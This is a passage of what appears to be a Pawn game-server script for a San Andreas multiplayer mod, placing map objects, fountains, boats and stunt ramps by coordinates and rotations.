	CreateSObject(643, 2113.641357, 1330.292847, 10.290784, 0.0000, 0.0000, 0.0000);
	CreateSObject(1432, 2113.465332, 1336.143799, 9.952114, 0.0000, 0.0000, 0.0000);
	CreateSObject(1432, 2123.496094, 1328.900757, 9.952114, 0.0000, 0.0000, 0.0000);
	CreateSObject(1679, 2118.012939, 1332.941162, 10.309132, 0.0000, 0.0000, 0.0000);
	CreateSObject(16778, 2108.020508, 1340.744385, 9.818312, 0.0000, 0.0000, 0.0000);
	CreateSObject(8491, 2181.898682, 1285.795044, 42.673840, 0.0000, 0.0000, 132.1875);
	CreateSObject(14467, 2019.896362, 1347.546265, 12.554106, 0.0000, 0.0000, 45.0000);
	CreateSObject(14467, 2018.985352, 1338.470093, 12.554106, 0.0000, 0.0000, 135.0000);
	// Fountains
	CreateFountain(9833, 2004.098267, 1328.686401, 6.143163, 0.0000, 0.0000, 0.0000);
	CreateFountain(9833, 1986.890137, 1328.906250, 5.743168, 0.0000, 0.0000, 0.0000);
	CreateFountain(9833, 1972.566895, 1328.797729, 5.118168, 0.0000, 0.0000, 0.0000);
	CreateFountain(9833, 2003.549316, 1357.535522, 5.793168, 0.0000, 0.0000, 0.0000);
	CreateFountain(9833, 1990.367310, 1357.743530, 5.668167, 0.0000, 0.0000, 0.0000);
	CreateFountain(9833, 1974.820313, 1358.196655, 5.693169, 0.0000, 0.0000, 0.0000);
	CreateFountain(9833, 2057.532715, 904.441345, 10.481941, 0.0000, 0.0000, 348.7500);
	CreateFountain(9833, 2057.1201171875, 1014.8731689453, 13.057224273682, 0, 0, 348.75);
	CreateFountain(9833, 2057.0844726563, 1055.3262939453, 13.129447937012, 0, 0, 0);
	CreateFountain(9833, 2056.4931640625, 1118.388671875, 13.086826324463, 0, 0, 0);
	CreateFountain(9833, 2056.9516601563, 1148.5535888672, 12.834987640381, 0, 0, 0);
	CreateFountain(9833, 2055.9758300781, 1228.4786376953, 13.091453552246, 0, 0, 0);
	CreateFountain(9833, 2056.5380859375, 1293.1765136719, 12.611192703247, 0, 0, 0);
	CreateFountain(9833, 2056.4970703125, 1311.185546875, 13.034034729004, 0, 0, 11.25);
	CreateFountain(9833, 2057.395020, 1327.279419, 12.360413, 0.0000, 0.0000, 11.2500);
	CreateFountain(9833, 2057.003174, 1337.104126, 12.557722, 0.0000, 0.0000, 11.2500);
	CreateFountain(9833, 2057.351807, 1412.588501, 12.380499, 0.0000, 0.0000, 11.2500);
	CreateFountain(9833, 2137.495361, 2018.988770, 12.767950, 0.0000, 0.0000, 11.2500);
	SetFountainsTo(random(sizeof(ObjectMaterials)));
	// Docks
	CreateVehicleEx(446,-1696.8885,1408.5394,-1.0461,313.1133,1,0);//
	CreateVehicleEx(446,-1701.9910,1415.2252,-0.3525,318.9497,0,0);//
	CreateVehicleEx(446,-1710.1815,1421.6633,-0.3181,316.0727,2,0);//
	CreateVehicleEx(446,-1770.7600,1428.8585,-0.8743,359.2935,5,0);//
	CreateVehicleEx(446,-1755.2124,1429.0720,-0.3379,2.0966,0,4);//
	CreateVehicleEx(446,-1762.8672,1429.4468,-0.7477,358.9936,3,0);//
	CreateSObject(6295,-1663.26135,1331.51843,29.75946,0.00000,0.00000,-168.53998);
	CreateSObject(18656,-1664.20117,1333.40649,52.84532,-33.00000,0.00000,-71.00000);
	CreateSObject(8620,-1665.80066,1295.46838,-5.65937,0.00000,0.00000,-46.07999);
	CreateSObject(3509,-1612.20325,1280.50671,5.82252,0.00000,0.00000,0.00000);
	CreateSObject(3509,-1622.47339,1280.61792,5.82252,0.00000,0.00000,0.00000);
	CreateSObject(3509,-1633.63464,1269.05347,5.82252,0.00000,0.00000,0.00000);
	CreateSObject(3509,-1623.25024,1259.26294,5.82252,0.00000,0.00000,0.00000);
	CreateSObject(3509,-1611.59753,1268.28137,5.82252,0.00000,0.00000,0.00000);
	CreateSObject(3578,-1667.18542,1310.39136,6.88918,0.00000,0.00000,44.34000);
	CreateSObject(3578,-1659.26819,1318.06177,6.88918,0.00000,0.00000,44.34000);
	CreateSObject(3578,-1635.79993,1279.13086,6.88918,0.00000,0.00000,42.24001);
	CreateSObject(3578,-1627.18091,1286.95874,6.88918,0.00000,0.00000,42.24001);
	CreateSObject(3578,-1645.27808,1280.16370,6.93396,0.00000,0.00000,-45.41999);
	CreateSObject(3578,-1653.42041,1288.25757,6.93656,0.00000,0.00000,-45.41999);
	CreateSObject(3578,-1634.37598,1302.38733,6.93656,0.00000,0.00000,-45.41999);
	CreateSObject(3578,-1643.95435,1312.10706,6.93656,0.00000,0.00000,-44.15999);
	CreateSObject(10166,-1531.59473,1323.57825,-6.52965,356.85840,0.00000,-28.74000);
	CreateSObject(3753,-1634.50195,1317.15930,-2.97887,0.00000,0.00000,-44.76000);
	CreateSObject(3886,-1626.86304,1305.72595,0.18783,0.00000,0.00000,-46.50000);
	CreateSObject(3886,-1619.27222,1312.93848,0.18783,0.00000,0.00000,-46.50000);
	CreateSObject(3886,-1611.65613,1320.15405,0.18783,0.00000,0.00000,-46.50000);
	CreateSObject(3886,-1627.42456,1315.24731,0.18783,0.00000,0.00000,45.24002);
	CreateSObject(3886,-1634.79651,1322.67065,0.18783,0.00000,0.00000,45.24002);
	CreateSObject(3886,-1626.54785,1324.63391,0.18783,0.00000,0.00000,-45.66000);
	CreateSObject(3886,-1619.08411,1331.96240,0.18783,0.00000,0.00000,-45.66000);
	CreateSObject(3886,-1637.78394,1329.93311,0.18783,0.00000,0.00000,135.48001);
	CreateSObject(3886,-1630.45105,1337.37402,0.18783,0.00000,0.00000,135.48001);
	CreateSObject(10166,-1569.35168,1410.46777,-6.52965,356.85840,0.00000,47.16000);
	CreateSObject(897,-1567.27783,1323.24927,-0.05999,0.00000,0.00000,0.00000);
	CreateSObject(897,-1572.15100,1339.99365,-0.05999,0.00000,0.00000,0.00000);
	CreateSObject(897,-1573.58521,1345.87427,-2.75428,0.00000,0.00000,0.00000);
	CreateSObject(897,-1578.27917,1373.79248,-0.05136,0.00000,0.00000,32.10000);
	CreateSObject(897,-1596.20557,1374.80371,-1.13155,0.00000,0.00000,50.70002);
	CreateSObject(897,-1602.25488,1374.12085,-3.74850,0.00000,0.00000,50.70002);
	CreateSObject(1280,-1731.32715,1243.00452,6.89404,0.00000,0.00000,0.00000);
	CreateSObject(1280,-1734.65747,1240.97083,6.89404,0.00000,0.00000,-106.19998);
	CreateSObject(2315,-1734.35217,1242.74194,6.54579,0.00000,0.00000,31.26000);
	CreateSObject(1219,-1738.00879,1238.94971,6.77306,0.00000,0.00000,0.00000);
	CreateSObject(19373,-1726.39087,1238.94031,13.97335,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1726.39087,1238.94031,10.54217,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1728.86975,1237.38806,13.91700,0.00000,-18.00000,33.00000);
	CreateSObject(19373,-1727.97009,1237.96777,15.64162,0.00000,91.00000,31.34000);
	CreateSObject(19373,-1728.90308,1237.40613,10.54220,0.00000,18.00000,32.48000);
	CreateSObject(19373,-1727.97009,1237.96777,8.87488,0.00000,91.00000,31.34000);
	CreateSObject(19373,-1727.15308,1238.47192,12.47975,-14.81999,95.79998,31.34000);
	CreateSObject(19373,-1730.10498,1236.64453,10.54217,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1730.10498,1236.64453,14.00382,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1733.00623,1234.90820,13.99150,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1731.71631,1235.64758,15.68176,0.00000,91.00000,31.34000);
	CreateSObject(19373,-1733.00623,1234.90820,10.55612,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1731.71631,1235.64758,12.37853,0.00000,91.00000,31.34000);
	CreateSObject(19373,-1737.62646,1231.99402,13.99150,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1734.65393,1233.73755,10.58356,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1736.32434,1232.71631,8.94839,0.00000,91.00000,31.34000);
	CreateSObject(19373,-1736.32434,1232.71631,15.66436,0.00000,91.00000,31.34000);
	CreateSObject(19373,-1734.65393,1233.73755,13.95820,0.00000,0.00000,38.04000);
	CreateSObject(19373,-1737.62646,1231.99402,10.66127,0.00000,0.00000,38.04000);
	CreateSObject(640,-1729.08643,1239.31531,6.80663,0.00000,0.00000,-57.77999);
	CreateSObject(640,-1733.37610,1236.59607,6.80663,0.00000,0.00000,-57.77999);
	CreateSObject(640,-1737.66016,1233.75134,6.80663,0.00000,0.00000,-57.77999);
	dbg(11,"6b");
	// Ramp
	CreateSObject(3749, 1861.573730, -1380.774292, 18.295916, 0.0000, 0.0000, 270.0000);
	CreateSObject(3461, 1858.231567, -1386.668457, 14.137511, 0.0000, 0.0000, 0.0000);
	CreateSObject(3461, 1858.519287, -1374.732056, 14.137511, 0.0000, 0.0000, 0.0000);
	CreateSObject(3528, 1858.989502, -1380.560425, 23.072603, 0.0000, 0.0000, 180.0000);
	CreateSObject(640, 1973.765381, -1449.784790, 13.176589, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1968.737915, -1449.784912, 13.175998, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1964.618774, -1449.783813, 13.177544, 0.0000, 0.0000, 90.0000);
	CreateSObject(669, 1974.305664, -1444.198486, 12.833287, 0.0000, 0.0000, 0.0000);
	CreateSObject(1256, 1969.916870, -1448.239258, 13.100843, 0.0000, 0.0000, 315.0000);
	CreateSObject(1256, 1971.054565, -1444.781494, 13.185133, 0.0000, 0.0000, 0.0000);
	CreateSObject(1256, 1968.683838, -1442.142334, 13.193259, 0.0000, 0.0000, 67.5000);
	CreateSObject(640, 1954.162231, -1449.712280, 13.164303, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1948.777710, -1449.699707, 13.169079, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1943.436523, -1449.699341, 13.169160, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1938.076172, -1449.698730, 13.168000, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1932.711304, -1449.699341, 13.163258, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1927.331421, -1449.694458, 13.159637, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1922.096924, -1449.696045, 13.159152, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1916.724609, -1449.696167, 13.157177, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1911.388062, -1449.695557, 13.154863, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1906.052979, -1449.694458, 13.154730, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1900.707397, -1449.694214, 13.154634, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1895.358276, -1449.694702, 13.151926, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1889.997559, -1449.690063, 13.165686, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1884.635254, -1449.692871, 13.157067, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1879.260254, -1449.691406, 13.165217, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1873.895386, -1449.689331, 13.169182, 0.0000, 0.0000, 90.0000);
	CreateSObject(640, 1868.501953, -1449.677490, 13.189983, 0.0000, 0.0000, 90.0000);
	CreateSObject(671, 1865.564819, -1448.575684, 12.738835, 0.0000, 0.0000, 22.5000);
	// Stunts
	CreateSObject(18826, -1358.33020, -122.87280, 32.44000,   0.00000, 0.00000, 243.96001);
	CreateSObject(18826, -1369.58997, -139.87000, 64.67000,   11.00000, -183.00000, 248.00000);
	CreateSObject(18826, -1378.47998, -112.74000, 82.17000,   -98.00000, -18.00000, 229.00000);
	CreateSObject(18811, -1407.53003, -138.47000, 80.52000,   -18.00000, -98.00000, 62.73000);
	CreateSObject(18809, -1425.67004, -183.48000, 77.67000,   -40.00000, -91.00000, 250.63000);
	CreateSObject(18820, -1442.48999, -230.09000, 75.51000,   -84.00000, 18.00000, 357.13000);
	CreateSObject(18982, -1512.56995, -204.78000, 76.32000,   0.00000, 0.00000, 250.58000);
	CreateSObject(18982, -1606.46997, -171.77000, 76.32000,   0.00000, 0.00000, 250.67999);
	CreateSObject(18780, -1684.77002, -143.75000, 83.00000,   0.00000, 0.00000, 160.03999);
	CreateSObject(18984, -1374.55005, -258.38000, 74.76000,   0.00000, 0.00000, 246.25000);
	CreateSObject(19001, -1312.66003, -277.59000, 79.89000,   0.00000, 0.00000, 334.20999);
	CreateSObject(18809, -1460.87000, -275.50000, 73.58000,   0.00000, -91.00000, 246.39999);
	CreateSObject(18809, -1480.67004, -320.67001, 74.51000,   0.00000, -91.00000, 246.39999);
	CreateSObject(18809, -1500.04004, -365.41000, 75.01000,   0.00000, -91.00000, 246.39999);
	CreateSObject(18843, -1526.53003, -432.13000, 72.80000,   -273.00000, -178.00000, 157.17999);
	CreateSObject(18801, -1311.81006, 10.78000, 35.52000,   0.00000, 0.00000, 32.49000);
	CreateSObject(18801, -1314.63000, 31.13000, 35.52000,   0.00000, 0.00000, 32.49000);
	CreateSObject(18801, -1317.57996, 51.10000, 35.52000,   0.00000, 0.00000, 32.49000);
	CreateSObject(18836, -1367.05005, -45.53000, 25.21000,   18.00000, -4.00000, 40.00000);
	CreateSObject(18836, -1396.97998, -9.79000, 40.39000,   18.00000, -4.00000, 39.90000);
	CreateSObject(18837, -1416.44995, 21.30000, 48.45000,   -84.00000, -62.00000, 291.70001);
	CreateSObject(18836, -1391.92004, 49.42000, 47.65000,   -4.00000, -25.00000, -47.00000);
	CreateSObject(18836, -1355.47998, 82.72000, 44.18000,   -4.00000, -25.00000, 311.81000);
	CreateSObject(18836, -1319.04004, 115.42000, 40.82000,   -4.00000, 25.00000, 311.09000);
	CreateSObject(18838, -1305.44995, 127.01000, 62.87000,   0.00000, 0.00000, 41.68000);
	CreateSObject(18838, -1294.80005, 137.07001, 46.50000,   0.00000, -4.00000, -135.00000);
	CreateSObject(18840, -1287.69995, 153.06000, 69.22000,   -95.00000, 156.00000, 328.59000);
	CreateSObject(18836, -1341.42004, 233.37000, 67.82000,   0.00000, 0.00000, 40.00000);
	CreateSObject(18836, -1309.27002, 195.59000, 67.71000,   0.00000, 0.00000, 40.00000);
	CreateSObject(18838, -1362.25000, 258.16000, 75.77000,   0.00000, 0.00000, 310.48999);
	CreateSObject(18838, -1357.54004, 240.78000, 84.56000,   -98.00000, -193.00000, 298.51999);
	CreateSObject(18838, -1378.78003, 241.89999, 84.56000,   -98.00000, -193.00000, 120.00000);
	CreateSObject(18835, -1371.06006, 188.78000, 53.73000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18837, -1367.71997, 185.05000, 31.43000,   0.00000, -46.00000, 315.32999);
	CreateSObject(18847, -1217.27039, -446.27386, 150.56000,   0.00000, 0.00000, 236.00000);
	CreateSObject(18788, -1244.41003, -28.84000, 22.50000,   0.00000, -33.00000, 40.00000);
	CreateSObject(18788, -1220.96997, -9.03000, 42.41000,   0.00000, -33.00000, 40.00000);
	CreateSObject(18789, -1160.76001, -46.32000, 52.71000,   0.00000, 0.00000, 308.60001);
	CreateSObject(18791, -1095.67004, -139.30000, 55.51000,   -1.00000, 4.00000, 107.01000);
	CreateSObject(18800, -1116.87000, -205.98000, 68.61000,   2.00000, 0.00000, 265.60999);
	CreateSObject(18800, -1112.71997, -147.47000, 92.20000,   -2.00000, 0.00000, 84.30000);
	CreateSObject(18800, -1112.71997, -147.47000, 92.20000,   -2.00000, 0.00000, 84.30000);
	CreateSObject(18789, -1100.94995, -251.30000, 123.25000,   2.00000, -14.00000, 264.41000);
	CreateSObject(18801, -1118.55005, -324.10001, 164.14000,   0.00000, 0.00000, 270.20999);
	CreateSObject(18788, -1133.23999, -342.64001, 136.37000,   0.00000, -12.00000, 74.00000);
	CreateSObject(698, -1345.71997, -295.87000, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1408.55005, -231.53000, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1328.81006, -290.14001, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1405.59998, -218.88000, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1293.12000, -276.01001, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1276.08997, -268.32999, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1392.42407, -183.05222, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1383.60999, -162.99001, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1309.46997, -281.67001, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(698, -1396.18005, -202.00999, 13.12000,   0.00000, 0.00000, -54.00000);
	CreateSObject(660, -1390.76001, -204.67000, 13.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(660, -1390.78003, -204.67000, 13.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(660, -1378.69995, -167.89999, 13.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(660, -1283.13000, -262.04001, 13.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(660, -1317.41003, -275.97000, 13.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18651, -1293.05005, -275.06000, 36.41000,   -61.00000, 0.00000, -69.00000);
	CreateSObject(18651, -1274.18005, -255.61000, 22.06000,   -91.00000, -11.00000, 76.00000);
	CreateSObject(18651, -1330.79004, -285.73999, 21.49000,   0.00000, 0.00000, -62.00000);
	CreateSObject(18651, -1330.79004, -285.73999, 21.49000,   0.00000, 0.00000, -62.00000);
	CreateSObject(18651, -1329.10999, -289.56000, 36.91000,   -71.00000, 0.00000, -26.00000);
	CreateSObject(18651, -1392.62000, -211.08000, 22.04000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18651, -1389.14001, -182.66000, 34.98000,   -57.00000, -55.00000, -62.00000);
	CreateSObject(18651, -1380.69995, -162.97000, 35.81000,   0.00000, 0.00000, 0.00000);
	CreateSObject(7666, -1408.35999, -231.96001, 56.94000,   0.00000, 0.00000, 359.89999);
	CreateSObject(7666, -1401.81006, -219.10001, 56.94000,   0.00000, 0.00000, 359.89999);
	CreateSObject(7666, -1395.69995, -202.42000, 56.94000,   0.00000, 0.00000, 359.89999);
	CreateSObject(7666, -1390.81995, -182.53999, 56.77000,   0.00000, 0.00000, 359.89999);
	CreateSObject(7666, -1382.05005, -163.06000, 56.77000,   0.00000, 0.00000, 359.89999);
	CreateSObject(7666, -1275.35999, -268.62000, 56.44000,   0.00000, 0.00000, 359.39999);
	CreateSObject(7666, -1292.66003, -274.97000, 56.04000,   0.00000, 0.00000, 307.82001);
	CreateSObject(7666, -1310.38000, -280.57999, 55.53000,   0.00000, 0.00000, 0.20000);
	CreateSObject(7666, -1329.06006, -289.17999, 55.54000,   0.00000, 0.00000, 318.10001);
	CreateSObject(7666, -1345.77002, -294.97000, 55.54000,   0.00000, 0.00000, 317.89999);
	CreateSObject(18647, -1345.81995, -294.97000, 55.59000,   0.00000, 0.00000, 288.31000);
	CreateSObject(18647, -1310.33997, -280.56000, 55.69000,   -88.00000, 0.00000, 314.00000);
	CreateSObject(18647, -1275.42004, -268.54001, 56.45000,   0.00000, 0.00000, 329.35999);
	CreateSObject(18647, -1275.42004, -268.54001, 56.45000,   0.00000, 0.00000, 329.35999);
	CreateSObject(18647, -1292.80005, -274.98001, 56.19000,   0.00000, 0.00000, 284.66000);
	CreateSObject(18647, -1329.07996, -289.14001, 55.89000,   -85.00000, 0.00000, 5.97000);
	CreateSObject(18647, -1267.43005, -261.38000, 29.16000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1284.48999, -268.17001, 22.66000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1306.33997, -269.41000, 26.20000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1310.08997, -280.07001, 35.05000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1327.37000, -277.91000, 24.70000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1343.08997, -284.28000, 30.25000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1403.27002, -230.38000, 30.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18647, -1393.75000, -212.48000, 23.28000,   -76.00000, 0.00000, 357.00000);
	CreateSObject(18647, -1394.56995, -200.80000, 33.23000,   -62.00000, 0.00000, 3.00000);
	CreateSObject(18647, -1385.79004, -182.58000, 26.06000,   0.00000, 0.00000, 0.10000);
	CreateSObject(18647, -1379.69995, -163.09000, 25.38000,   0.00000, 0.00000, 0.23000);
	CreateSObject(18649, -1338.47998, -280.78000, 27.62000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1342.55005, -285.26999, 34.17000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1309.26001, -279.14999, 29.24000,   -95.00000, 0.00000, 0.10000);
	CreateSObject(18649, -1275.87000, -265.54001, 29.52000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1400.03003, -221.52000, 30.19000,   -69.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1405.44995, -229.83000, 38.32000,   -55.00000, 0.00000, 2.00000);
	CreateSObject(18649, -1386.90002, -194.19000, 26.68000,   -55.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1390.28003, -182.63000, 41.73000,   -33.00000, 0.00000, 0.00000);
	CreateSObject(18649, -1382.31006, -162.42000, 42.04000,   -55.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1345.81006, -294.92001, 55.65000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1329.03003, -289.20001, 55.70000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1310.40002, -280.59000, 55.57000,   0.00000, 0.00000, 0.33000);
	CreateSObject(18646, -1292.76001, -275.00000, 56.23000,   0.00000, 0.00000, 359.41000);
	CreateSObject(18646, -1275.42004, -268.69000, 56.57000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1382.05005, -163.05000, 56.92000,   0.00000, 0.00000, 359.76999);
	CreateSObject(18646, -1390.81006, -182.58000, 56.66000,   0.00000, 0.00000, 359.41000);
	CreateSObject(18646, -1395.67004, -202.39999, 56.99000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1401.82996, -219.06000, 56.92000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18646, -1408.35999, -231.97000, 56.92000,   0.00000, 0.00000, 359.32999);
	CreateSObject(18650, -1345.17004, -294.28000, 26.20000,   0.00000, 0.00000, 359.76999);
	CreateSObject(18650, -1348.20996, -296.19000, 35.75000,   -49.00000, 0.00000, 357.00000);
	CreateSObject(18650, -1319.94995, -282.37000, 23.94000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1312.34998, -281.04001, 22.97000,   -69.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1328.83997, -289.51001, 30.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1294.09998, -272.42001, 24.37000,   0.00000, 0.00000, 0.85000);
	CreateSObject(18650, -1276.42004, -267.47000, 36.71000,   -76.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1398.48999, -212.07001, 23.82000,   -79.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1391.25000, -201.53999, 25.89000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18650, -1382.35999, -175.16000, 21.31000,   0.00000, 0.00000, 3.04000);
	CreateSObject(18650, -1374.02002, -156.38000, 28.39000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1398.73999, -219.00999, 35.67000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1392.12000, -209.91000, 25.29000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1383.01001, -175.84000, 21.96000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1279.63000, -264.17001, 38.88000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18652, -1330.30005, -283.47000, 27.24000,   0.00000, 0.00000, 0.93000);
	CreateSObject(18652, -1343.81006, -284.44000, 24.75000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1385.68994, -195.41000, 25.53000,   -55.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1394.44995, -201.47000, 39.70000,   -83.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1407.12000, -234.06000, 31.55000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18648, -1279.93994, -268.85999, 32.61000,   0.00000, 0.00000, 359.73999);
	CreateSObject(18648, -1390.13000, -186.45000, 29.27000,   0.00000, 0.00000, 0.00000);
	CreateSObject(8483, -1360.35999, -277.25000, 18.66000,   0.00000, 0.00000, 31.62000);
	CreateSObject(8483, -1376.66003, -258.17001, 19.07000,   0.00000, 0.00000, 31.62000);
	CreateSObject(8483, -1395.29004, -240.97000, 19.07000,   0.00000, 0.00000, 40.00000);
	CreateSObject(3528, -1363.93005, -274.00000, 22.56000,   0.00000, 4.00000, 33.00000);
	CreateSObject(3528, -1372.37000, -265.47000, 22.56000,   0.00000, 4.00000, 33.00000);
	CreateSObject(3528, -1382.25000, -255.92999, 22.56000,   0.00000, 4.00000, 33.00000);
	CreateSObject(3528, -1390.21997, -248.08000, 22.56000,   0.00000, 4.00000, 40.00000);
	CreateSObject(18750, -1378.72998, -269.54001, 46.83000,   -273.00000, 0.00000, 135.00000);
	CreateSObject(7073, -1330.48999, -15.87000, 31.68000,   0.00000, 0.00000, 329.45999);
	CreateSObject(3461, -1354.10999, -274.47000, 14.26000,   0.00000, 0.00000, 358.73001);
	CreateSObject(3461, -1370.47998, -255.42000, 14.46000,   0.00000, 0.00000, 358.73001);
	CreateSObject(3461, -1389.43005, -237.03999, 14.46000,   0.00000, 0.00000, 358.73001);
	CreateSObject(3461, -1349.55005, -283.64999, 14.26000,   0.00000, 0.00000, 358.73001);
	CreateSObject(3461, -1364.38000, -265.31000, 14.26000,   0.00000, 0.00000, 358.73001);
	CreateSObject(3461, -1380.70996, -246.48000, 14.26000,   0.00000, 0.00000, 358.73001);
	CreateSObject(3461, -1398.26001, -229.80000, 14.26000,   0.00000, 0.00000, 358.73001);
	CreateSObject(13641, -1262.10999, -230.20000, 13.08000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19002, -1239.28003, -229.44000, 20.80000,   0.00000, 0.00000, 269.10999);
	CreateSObject(13641, -1206.07996, -231.97000, 13.08000,   0.00000, 0.00000, 174.52000);
	CreateSObject(13638, -1142.20996, -268.29001, 14.78000,   0.00000, 0.00000, 159.57001);
	CreateSObject(13638, -1148.72998, -266.73999, 22.46000,   0.00000, 0.00000, 342.79999);
	CreateSObject(13592, -1213.87000, -321.91000, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13638, -1143.75000, -269.20001, 30.09000,   0.00000, 0.00000, 160.11000);
	CreateSObject(13648, -1150.56006, -294.37000, 33.33000,   0.00000, 0.00000, 338.62000);
	CreateSObject(6052, -1153.28003, -321.94000, 35.29000,   0.00000, 0.00000, 344.69000);
	CreateSObject(6052, -1140.85999, -344.17999, 35.29000,   0.00000, 0.00000, 164.00000);
	CreateSObject(13639, -1140.43005, -359.92999, 33.33000,   0.00000, 0.00000, 331.07001);
	CreateSObject(18780, -1154.15002, -398.19000, 4.99000,   0.00000, 0.00000, 70.77000);
	CreateSObject(19002, -1229.96997, -230.80000, 20.80000,   0.00000, 0.00000, 269.10999);
	CreateSObject(13592, -1214.93005, -329.04001, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13592, -1215.95996, -336.32001, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13592, -1217.03003, -343.48001, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13592, -1218.05005, -350.28000, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13592, -1219.10999, -357.44000, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13592, -1220.01001, -363.39001, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(13592, -1220.92004, -369.39001, 23.02000,   0.00000, 0.00000, 0.00000);
	CreateSObject(18809, -1208.15002, -187.52000, 22.21000,   -55.00000, -109.00000, 298.29001);
	CreateSObject(18826, -1185.80005, -211.61000, 43.42000,   4.00000, -185.00000, 316.32999);
	CreateSObject(18826, -1200.04004, -197.56000, 75.07000,   4.00000, -185.00000, 134.47000);
	CreateSObject(18824, -1186.23999, -227.12000, 90.41000,   -98.00000, -84.00000, 96.11000);
	CreateSObject(18809, -1206.56006, -265.92999, 74.20000,   -54.00000, -171.00000, 329.29001);
	CreateSObject(18822, -1231.90002, -299.07999, 47.72000,   -4.00000, -113.00000, 54.82000);
	CreateSObject(18809, -1259.78003, -337.04999, 38.06000,   0.00000, -84.00000, 231.46001);
	CreateSObject(18809, -1290.51001, -375.70999, 32.92000,   0.00000, -84.00000, 231.46001);
	CreateSObject(18826, -1331.13000, -452.47000, 23.41000,   -84.00000, -55.00000, 355.04999);
	CreateSObject(18809, -1321.25000, -414.73001, 27.81000,   0.00000, -84.00000, 231.67000);
	CreateSObject(18809, -1295.70996, -440.23001, 22.90000,   4.00000, -91.00000, 221.39999);
	CreateSObject(18809, -1258.00000, -407.82999, 21.99000,   4.00000, -91.00000, 220.28000);
	CreateSObject(18822, -1225.41003, -371.79001, 21.61000,   -84.00000, -98.00000, 53.79000);
	CreateSObject(18809, -1213.15002, -326.70001, 22.10000,   0.00000, -90.00000, 262.23999);
	CreateSObject(18826, -1208.21997, -292.17001, 37.93000,   0.00000, 0.00000, 261.26001);
	CreateSObject(18809, -1212.85999, -326.14999, 53.22000,   0.00000, -91.00000, 82.76000);
